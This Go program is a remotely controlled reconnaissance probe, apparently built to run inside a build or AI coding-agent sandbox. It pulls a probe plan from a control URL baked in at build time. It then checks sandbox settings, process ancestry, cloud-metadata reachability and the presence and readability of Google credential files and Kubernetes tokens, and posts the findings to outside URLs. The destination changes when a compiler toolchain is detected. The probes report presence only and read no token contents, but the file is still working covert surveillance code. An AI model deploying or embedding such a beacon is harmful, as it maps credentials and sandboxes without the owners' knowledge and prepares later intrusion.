package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var controlURL string
var genericResultURL string
var compilerResultURL string
var resultMethod string
var sessionNonce string
var probeUserAgent string

const (
	protocolVersion   = 1
	maximumPlanBytes  = 4096
	maximumResult     = 8192
	maximumProcBytes  = 64 * 1024
	maximumAncestry   = 12
	maximumDirEntries = 512
)

var allowedProbes = map[string]bool{
	"runtime":                       true,
	"ancestry":                      true,
	"sandbox":                       true,
	"tmp-write-delete":              true,
	"metadata-tcp":                  true,
	"identity-file-open-close":      true,
	"metadata-identity-status-only": true,
	"cwd-summary":                   true,
	"directory-summary":             true,
}

type plan struct {
	Version int      `json:"version"`
	Session string   `json:"session"`
	Probes  []string `json:"probes"`
}

type runtimeResult struct {
	GOOS       string `json:"goos"`
	GOARCH     string `json:"goarch"`
	KernelOS   string `json:"kernel_os"`
	Machine    string `json:"machine"`
	UID        int    `json:"uid"`
	EUID       int    `json:"euid"`
	GID        int    `json:"gid"`
	EGID       int    `json:"egid"`
	CCClass    string `json:"cc_class"`
	CGOEnabled string `json:"cgo_enabled"`
}

type ancestryResult struct {
	ProcReadable     bool `json:"proc_readable"`
	AncestorClang    bool `json:"ancestor_clang"`
	AncestorCgo      bool `json:"ancestor_cgo"`
	AncestorGo       bool `json:"ancestor_go"`
	AncestorCapslock bool `json:"ancestor_capslock"`
	ReachedPID1      bool `json:"reached_pid1"`
	DepthTruncated   bool `json:"depth_truncated"`
}

type sandboxResult struct {
	StatusReadable       bool `json:"status_readable"`
	SeccompMode          int  `json:"seccomp_mode"`
	NoNewPrivileges      bool `json:"no_new_privileges"`
	EffectiveCapsNonzero bool `json:"effective_caps_nonzero"`
	CgroupReadable       bool `json:"cgroup_readable"`
	ContainerHint        bool `json:"container_hint"`
	KubernetesHint       bool `json:"kubernetes_hint"`
}

type filesystemResult struct {
	TmpWriteDelete    bool `json:"tmp_write_delete"`
	OriginWriteDelete bool `json:"origin_write_delete"`
}

type identityResult struct {
	GoogleCredentialsEnvSet   bool `json:"google_credentials_env_set"`
	GoogleCredentialsFileOpen bool `json:"google_credentials_file_open"`
	KubernetesTokenPresent    bool `json:"kubernetes_token_present"`
	KubernetesTokenOpen       bool `json:"kubernetes_token_open"`
	ProjectedIdentityPresent  bool `json:"projected_identity_present"`
	ProjectedIdentityOpen     bool `json:"projected_identity_open"`
}

type metadataIdentityResult struct {
	Attempted    bool `json:"attempted"`
	StatusCode   int  `json:"status_code"`
	GoogleFlavor bool `json:"google_flavor"`
}

type cwdSummaryResult struct {
	Readable     bool   `json:"readable"`
	Absolute     bool   `json:"absolute"`
	Category     string `json:"category"`
	Depth        int    `json:"depth"`
	SameAsOrigin bool   `json:"same_as_origin"`
}

type directorySummaryResult struct {
	Readable    bool `json:"readable"`
	Total       int  `json:"total"`
	Regular     int  `json:"regular"`
	Directories int  `json:"directories"`
	Symlinks    int  `json:"symlinks"`
	Other       int  `json:"other"`
	Truncated   bool `json:"truncated"`
	HasGoMod    bool `json:"has_go_mod"`
	HasGoFiles  bool `json:"has_go_files"`
	HasGitEntry bool `json:"has_git_entry"`
}

type receipt struct {
	Version          int                     `json:"version"`
	Session          string                  `json:"session"`
	Runtime          *runtimeResult          `json:"runtime,omitempty"`
	Ancestry         *ancestryResult         `json:"ancestry,omitempty"`
	Sandbox          *sandboxResult          `json:"sandbox,omitempty"`
	Filesystem       *filesystemResult       `json:"filesystem,omitempty"`
	MetadataTCP      *bool                   `json:"metadata_tcp,omitempty"`
	Identity         *identityResult         `json:"identity,omitempty"`
	MetadataIdentity *metadataIdentityResult `json:"metadata_identity,omitempty"`
	CWDSummary       *cwdSummaryResult       `json:"cwd_summary,omitempty"`
	DirectorySummary *directorySummaryResult `json:"directory_summary,omitempty"`
}

func main() {
	if controlURL == "" || genericResultURL == "" || compilerResultURL == "" ||
		sessionNonce == "" || probeUserAgent == "" ||
		controlURL == genericResultURL || controlURL == compilerResultURL ||
		genericResultURL == compilerResultURL ||
		(resultMethod != http.MethodPost && resultMethod != http.MethodPut) {
		return
	}
	originDirectory := ""
	if len(os.Args) == 3 && os.Args[1] == "--origin-dir" && filepath.IsAbs(os.Args[2]) {
		originDirectory = filepath.Clean(os.Args[2])
	}

	client := &http.Client{
		Timeout: 6 * time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	request, err := http.NewRequest(http.MethodGet, controlURL, nil)
	if err != nil {
		return
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Accept", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	response, err := client.Do(request)
	if err != nil {
		return
	}
	body, readErr := io.ReadAll(io.LimitReader(response.Body, maximumPlanBytes+1))
	_ = response.Body.Close()
	if readErr != nil || response.StatusCode != http.StatusOK || len(body) > maximumPlanBytes {
		return
	}

	var selected plan
	decoder := json.NewDecoder(bytes.NewReader(body))
	decoder.DisallowUnknownFields()
	if decoder.Decode(&selected) != nil || selected.Version != protocolVersion ||
		selected.Session != sessionNonce || len(selected.Probes) == 0 ||
		len(selected.Probes) > len(allowedProbes) || decoder.Decode(&struct{}{}) != io.EOF {
		return
	}
	seen := make(map[string]bool, len(selected.Probes))
	for _, name := range selected.Probes {
		if !allowedProbes[name] || seen[name] {
			return
		}
		seen[name] = true
	}

	ancestry := collectAncestry()
	result := receipt{
		Version:  protocolVersion,
		Session:  sessionNonce,
		Ancestry: &ancestry,
	}
	for _, name := range selected.Probes {
		switch name {
		case "runtime":
			value := collectRuntime()
			result.Runtime = &value
		case "ancestry":
			// Ancestry is always collected so receipt routing cannot be disabled
			// by the remotely selected plan.
		case "sandbox":
			value := collectSandbox()
			result.Sandbox = &value
		case "tmp-write-delete":
			value := filesystemResult{
				TmpWriteDelete:    writeDelete("/tmp"),
				OriginWriteDelete: originDirectory != "" && writeDelete(originDirectory),
			}
			result.Filesystem = &value
		case "metadata-tcp":
			value := metadataTCP()
			result.MetadataTCP = &value
		case "identity-file-open-close":
			value := collectIdentityPresence()
			result.Identity = &value
		case "metadata-identity-status-only":
			value := metadataIdentityStatus()
			result.MetadataIdentity = &value
		case "cwd-summary":
			value := collectCWDSummary(originDirectory)
			result.CWDSummary = &value
		case "directory-summary":
			value := collectDirectorySummary()
			result.DirectorySummary = &value
		}
	}

	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return
	}
	destination := genericResultURL
	if result.Ancestry != nil && result.Ancestry.AncestorClang &&
		(result.Ancestry.AncestorCgo || result.Ancestry.AncestorGo) {
		destination = compilerResultURL
	}
	resultRequest, err := http.NewRequest(resultMethod, destination, bytes.NewReader(encoded))
	if err != nil {
		return
	}
	resultRequest.Header.Set("User-Agent", probeUserAgent)
	resultRequest.Header.Set("Content-Type", "application/json")
	resultRequest.Header.Set("X-Codex-Probe-Session", sessionNonce)
	resultResponse, err := client.Do(resultRequest)
	if err != nil {
		return
	}
	_, _ = io.Copy(io.Discard, io.LimitReader(resultResponse.Body, 1024))
	_ = resultResponse.Body.Close()
}

func classifyCompiler(value string) string {
	value = strings.ToLower(value)
	switch {
	case value == "":
		return "unset"
	case strings.Contains(value, "clang"):
		return "clang"
	case strings.Contains(value, "gcc"):
		return "gcc"
	default:
		return "other"
	}
}

func classifyCGO(value string) string {
	switch value {
	case "":
		return "unset"
	case "1":
		return "enabled"
	case "0":
		return "disabled"
	default:
		return "other"
	}
}

func utsString(value []int8) string {
	output := make([]byte, 0, len(value))
	for _, character := range value {
		if character == 0 {
			break
		}
		output = append(output, byte(character))
	}
	return string(output)
}

func collectRuntime() runtimeResult {
	result := runtimeResult{
		GOOS:       runtime.GOOS,
		GOARCH:     runtime.GOARCH,
		UID:        os.Getuid(),
		EUID:       os.Geteuid(),
		GID:        os.Getgid(),
		EGID:       os.Getegid(),
		CCClass:    classifyCompiler(os.Getenv("CC")),
		CGOEnabled: classifyCGO(os.Getenv("CGO_ENABLED")),
	}
	var system syscall.Utsname
	if syscall.Uname(&system) == nil {
		result.KernelOS = utsString(system.Sysname[:])
		result.Machine = utsString(system.Machine[:])
	}
	return result
}

func readBounded(path string, maximum int64) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	data, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(data)) > maximum {
		return nil, errors.New("bounded read failed")
	}
	return data, nil
}

func parentPID(pid int) (int, error) {
	data, err := readBounded("/proc/"+strconv.Itoa(pid)+"/stat", 4096)
	if err != nil {
		return 0, err
	}
	closing := strings.LastIndexByte(string(data), ')')
	if closing < 0 || closing+2 >= len(data) {
		return 0, errors.New("invalid proc stat")
	}
	fields := strings.Fields(string(data[closing+2:]))
	if len(fields) < 2 {
		return 0, errors.New("short proc stat")
	}
	return strconv.Atoi(fields[1])
}

func processClass(pid int) (clang, cgo, goTool, capslock bool) {
	var names []string
	if value, err := os.Readlink("/proc/" + strconv.Itoa(pid) + "/exe"); err == nil {
		names = append(names, filepath.Base(value))
	}
	if value, err := readBounded("/proc/"+strconv.Itoa(pid)+"/comm", 256); err == nil {
		names = append(names, strings.TrimSpace(string(value)))
	}
	if value, err := readBounded("/proc/"+strconv.Itoa(pid)+"/cmdline", 4096); err == nil {
		if first := strings.SplitN(string(value), "\x00", 2)[0]; first != "" {
			names = append(names, filepath.Base(first))
		}
	}
	for _, name := range names {
		name = strings.ToLower(name)
		clang = clang || strings.Contains(name, "clang")
		cgo = cgo || name == "cgo" || strings.HasSuffix(name, "-cgo")
		goTool = goTool || name == "go"
		capslock = capslock || strings.Contains(name, "capslock")
	}
	return
}

func collectAncestry() ancestryResult {
	result := ancestryResult{}
	pid := os.Getpid()
	for depth := 0; depth < maximumAncestry; depth++ {
		if pid <= 1 {
			result.ReachedPID1 = pid == 1
			return result
		}
		parent, err := parentPID(pid)
		if err != nil {
			return result
		}
		result.ProcReadable = true
		if parent <= 0 || parent == pid {
			return result
		}
		clang, cgo, goTool, capslock := processClass(parent)
		result.AncestorClang = result.AncestorClang || clang
		result.AncestorCgo = result.AncestorCgo || cgo
		result.AncestorGo = result.AncestorGo || goTool
		result.AncestorCapslock = result.AncestorCapslock || capslock
		pid = parent
	}
	result.DepthTruncated = true
	return result
}

func collectSandbox() sandboxResult {
	result := sandboxResult{SeccompMode: -1}
	if data, err := readBounded("/proc/self/status", maximumProcBytes); err == nil {
		result.StatusReadable = true
		for _, line := range strings.Split(string(data), "\n") {
			fields := strings.Fields(line)
			if len(fields) != 2 {
				continue
			}
			switch strings.TrimSuffix(fields[0], ":") {
			case "Seccomp":
				if value, err := strconv.Atoi(fields[1]); err == nil {
					result.SeccompMode = value
				}
			case "NoNewPrivs":
				result.NoNewPrivileges = fields[1] == "1"
			case "CapEff":
				result.EffectiveCapsNonzero = strings.TrimLeft(fields[1], "0") != ""
			}
		}
	}
	if data, err := readBounded("/proc/self/cgroup", 16*1024); err == nil {
		result.CgroupReadable = true
		value := strings.ToLower(string(data))
		result.ContainerHint = strings.Contains(value, "docker") ||
			strings.Contains(value, "containerd") || strings.Contains(value, "libpod")
		result.KubernetesHint = strings.Contains(value, "kubepods") || strings.Contains(value, "kube")
	}
	return result
}

func pathWithin(path, root string) bool {
	return path == root || strings.HasPrefix(path, root+string(filepath.Separator))
}

func pathDepth(path string) int {
	trimmed := strings.Trim(filepath.Clean(path), string(filepath.Separator))
	if trimmed == "" {
		return 0
	}
	depth := len(strings.Split(trimmed, string(filepath.Separator)))
	if depth > 32 {
		return 32
	}
	return depth
}

func collectCWDSummary(originDirectory string) cwdSummaryResult {
	result := cwdSummaryResult{Category: "unavailable"}
	workingDirectory, err := os.Getwd()
	if err != nil {
		return result
	}
	workingDirectory = filepath.Clean(workingDirectory)
	result.Readable = true
	result.Absolute = filepath.IsAbs(workingDirectory)
	result.Depth = pathDepth(workingDirectory)
	result.SameAsOrigin = originDirectory != "" && workingDirectory == originDirectory
	switch {
	case workingDirectory == string(filepath.Separator):
		result.Category = "root"
	case pathWithin(workingDirectory, "/tmp") || pathWithin(workingDirectory, "/var/tmp"):
		result.Category = "temporary"
	case pathWithin(workingDirectory, "/workspace"):
		result.Category = "workspace"
	case pathWithin(workingDirectory, "/home") || pathWithin(workingDirectory, "/root"):
		result.Category = "home"
	default:
		result.Category = "other"
	}
	return result
}

func collectDirectorySummary() directorySummaryResult {
	result := directorySummaryResult{}
	directory, err := os.Open(".")
	if err != nil {
		return result
	}
	defer directory.Close()

	entries, err := directory.ReadDir(maximumDirEntries + 1)
	if err != nil && !errors.Is(err, io.EOF) {
		return result
	}
	result.Readable = true
	if len(entries) > maximumDirEntries {
		entries = entries[:maximumDirEntries]
		result.Truncated = true
	}
	result.Total = len(entries)
	for _, entry := range entries {
		name := entry.Name()
		result.HasGoMod = result.HasGoMod || name == "go.mod"
		result.HasGoFiles = result.HasGoFiles || strings.HasSuffix(name, ".go")
		result.HasGitEntry = result.HasGitEntry || name == ".git"

		switch entryType := entry.Type(); {
		case entryType&os.ModeSymlink != 0:
			result.Symlinks++
		case entry.IsDir():
			result.Directories++
		case entryType.IsRegular():
			result.Regular++
		default:
			result.Other++
		}
	}
	return result
}

func writeDelete(directory string) bool {
	file, err := os.CreateTemp(directory, ".go-cgo-v008-codex-")
	if err != nil {
		return false
	}
	name := file.Name()
	ok := false
	if _, err = file.Write([]byte("v0.0.8-codex\n")); err == nil && file.Sync() == nil && file.Close() == nil {
		ok = os.Remove(name) == nil
	} else {
		_ = file.Close()
		_ = os.Remove(name)
	}
	return ok
}

func metadataTCP() bool {
	connection, err := net.DialTimeout("tcp", "169.254.169.254:80", 350*time.Millisecond)
	if err != nil {
		return false
	}
	_ = connection.Close()
	return true
}

func openClose(path string) (present, opened bool) {
	if path == "" {
		return false, false
	}
	if _, err := os.Stat(path); err != nil {
		return false, false
	}
	present = true
	file, err := os.Open(path)
	if err != nil {
		return present, false
	}
	_ = file.Close()
	return present, true
}

func collectIdentityPresence() identityResult {
	result := identityResult{}
	credentialPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")
	result.GoogleCredentialsEnvSet = credentialPath != ""
	_, result.GoogleCredentialsFileOpen = openClose(credentialPath)
	for _, path := range []string{
		"/var/run/secrets/kubernetes.io/serviceaccount/token",
		"/var/run/secrets/tokens/ksa-token",
	} {
		present, opened := openClose(path)
		result.KubernetesTokenPresent = result.KubernetesTokenPresent || present
		result.KubernetesTokenOpen = result.KubernetesTokenOpen || opened
	}
	for _, path := range []string{
		"/var/run/secrets/tokens/gcp-ksa/token",
		"/var/run/secrets/workload-spiffe-credentials/token",
	} {
		present, opened := openClose(path)
		result.ProjectedIdentityPresent = result.ProjectedIdentityPresent || present
		result.ProjectedIdentityOpen = result.ProjectedIdentityOpen || opened
	}
	return result
}

func metadataIdentityStatus() metadataIdentityResult {
	result := metadataIdentityResult{Attempted: true}
	transport := &http.Transport{
		Proxy:                 nil,
		DisableKeepAlives:     true,
		DialContext:           (&net.Dialer{Timeout: 350 * time.Millisecond}).DialContext,
		ResponseHeaderTimeout: 500 * time.Millisecond,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	request, err := http.NewRequest(http.MethodGet,
		"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/", nil)
	if err != nil {
		return result
	}
	request.Header.Set("Metadata-Flavor", "Google")
	response, err := client.Do(request)
	if err != nil {
		return result
	}
	result.StatusCode = response.StatusCode
	result.GoogleFlavor = response.Header.Get("Metadata-Flavor") == "Google"
	_ = response.Body.Close()
	return result
}
